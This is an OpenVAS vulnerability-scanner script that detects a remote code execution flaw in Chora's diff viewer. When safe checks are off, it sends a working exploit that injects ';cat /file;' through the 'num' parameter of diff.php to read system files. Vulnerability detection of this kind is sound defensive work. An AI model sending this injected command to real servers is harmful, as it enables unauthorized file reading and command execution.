# OpenVAS Vulnerability Test
# $Id: chora_remote_code_execution.nasl 13218 2019-01-22 12:34:39Z cfischer $
# Description: Chora Remote Code Execution Vulnerability
#
# Authors:
# George A. Theall, <theall@tifaware.com>
#
# Copyright:
# Copyright (C) 2004 George A. Theall
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

CPE = "cpe:/a:horde:chora";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.12281");
  script_version("$Revision: 13218 $");
  script_bugtraq_id(10531);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2019-01-22 13:34:39 +0100 (Tue, 22 Jan 2019) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_name("Chora Remote Code Execution Vulnerability");
  script_category(ACT_MIXED_ATTACK);
  script_tag(name:"qod_type", value:"remote_active");
  script_copyright("This script is Copyright (C) 2004 George A. Theall");
  script_family("Web application abuses");
  script_dependencies("chora_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("chora/detected");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"solution", value:"Upgrade to Chora version 1.2.2 or later.");

  script_tag(name:"summary", value:"The remote server is running at least one instance of Chora version
  1.2.1 or earlier. Such versions have a flaw in the diff viewer that enables a remote attacker to run
  arbitrary code with the permissions of the web user.");

  script_xref(name:"URL", value:"http://security.e-matters.de/advisories/102004.html");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("host_details.inc");
include("version_func.inc");

if(!port = get_app_port(cpe:CPE))
  exit(0);

if(!infos = get_app_version_and_location(cpe:CPE, port:port, exit_no_version:FALSE))
  exit(0);

ver = infos["version"];
dir = infos["location"];

# This function finds a file in CVS, recursing directories if necessary.
# Args:
#   - basedir is the web path to cvs.php
#   - cvsdir is the CVS directory to look in.
# Return:
#   - filename of the first file it finds in CVS or an empty
#     string if none can be located.
function find_cvsfile(basedir, cvsdir) {
  local_var url, req, res, pat, matches, m, files, dirs;

  url = string(basedir, "/cvs.php", cvsdir);

  req = http_get(item:url, port:port);
  res = http_keepalive_send_recv(port:port, data:req);
  if (res == NULL) return "";           # can't connect

  if (egrep(string:res, pattern:"^HTTP/.* 200 OK")) {
    # Identify files.
    pat = "/co\.php/.*(/.+)\?r=";
    matches = egrep(string:res, pattern:pat);
    if (!isnull(matches)) {
      foreach m (split(matches)) {
        files = eregmatch(string:m, pattern:pat);
        if (!isnull(files)) {
          # Return the first file we find.
          return(string(cvsdir, files[1]));
        }
      }
    }

    # Identify directories and recurse into each until we find a file.
    pat = "folder\.gif[^>]+>&nbsp;([^<]+)/</a>";
    matches = egrep(string:res, pattern:pat);
    if (!isnull(matches)) {
      foreach m (split(matches)) {
        dirs = eregmatch(string:m, pattern:pat);
        if (!isnull(dirs)) {
          file = find_cvsfile(basedir:basedir, cvsdir:string(cvsdir, "/", dirs[1]));
          if (!isnull(file)) return(file);
        }
      }
    }
  }
}

# If safe_checks is enabled, rely on the version number alone.
if(safe_checks()) {
  if(ver && ereg(pattern:"^(0\.|1\.(0\.|1\.|2|2\.1))(-(cvs|ALPHA))$", string:ver)) {
    report = report_fixed_ver(installed_version:ver, fixed_version:"1.2.2");
    security_message(port:port, data:report);
    exit(0);
  }
}
# Else, try an exploit.
else {

  files = traversal_files();

  file = find_cvsfile(basedir:dir, cvsdir:"");
  if (!isnull(file)) {

    foreach pattern(keys(files)) {

      file = files[pattern];
      # nb: I'm not sure 1.1 will always be available; it might be better to pull revision numbers from chora.
      rev = "1.1";
      # nb: setting the type to "context" lets us see the output
      url = string(dir, "/diff.php", file, "?r1=", rev, "&r2=", rev, "&ty=c", "&num=3;cat%20/" + file + ";");

      req = http_get(item:url, port:port);
      res = http_keepalive_send_recv(port:port, data:req);
      if(!res) continue;

      if(egrep(string:res, pattern:pattern)) {
        report = report_vuln_url(port:port, url:url);
        security_message(port:port, data:report);
        exit(0);
      }
    }
  }
}
